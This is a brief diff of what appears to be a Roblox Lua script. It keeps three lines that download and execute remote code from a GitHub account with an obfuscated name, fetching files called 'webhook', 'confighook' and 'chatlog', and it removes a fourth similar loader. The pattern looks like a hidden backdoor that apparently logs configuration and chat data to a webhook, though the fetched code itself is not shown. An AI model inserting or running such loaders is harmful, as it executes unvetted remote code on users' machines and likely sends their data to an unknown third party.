@@ -2,7 +2,6 @@
     loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlllllIllIIlIlIlIlIllIIlIlIIIIlIll/IlIlIlIlIlIlIIIIIlIlIlIlIlIlIlIlllIlIlIl/refs/heads/main/webhook",true))()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlllllIllIIlIlIlIlIllIIlIlIIIIlIll/IlIlIlIlIlIlIIIIIlIlIlIlIlIlIlIlllIlIlIl/refs/heads/main/confighook",true))()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlllllIllIIlIlIlIlIllIIlIlIIIIlIll/IlIlIlIlIlIlIIIIIlIlIlIlIlIlIlIlllIlIlIl/refs/heads/main/chatlog",true))()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/waowhubIlIl/waowfire/refs/heads/main/waowfireweb"))()
 
 
 -- [[ 1. SERVİSLER ]]
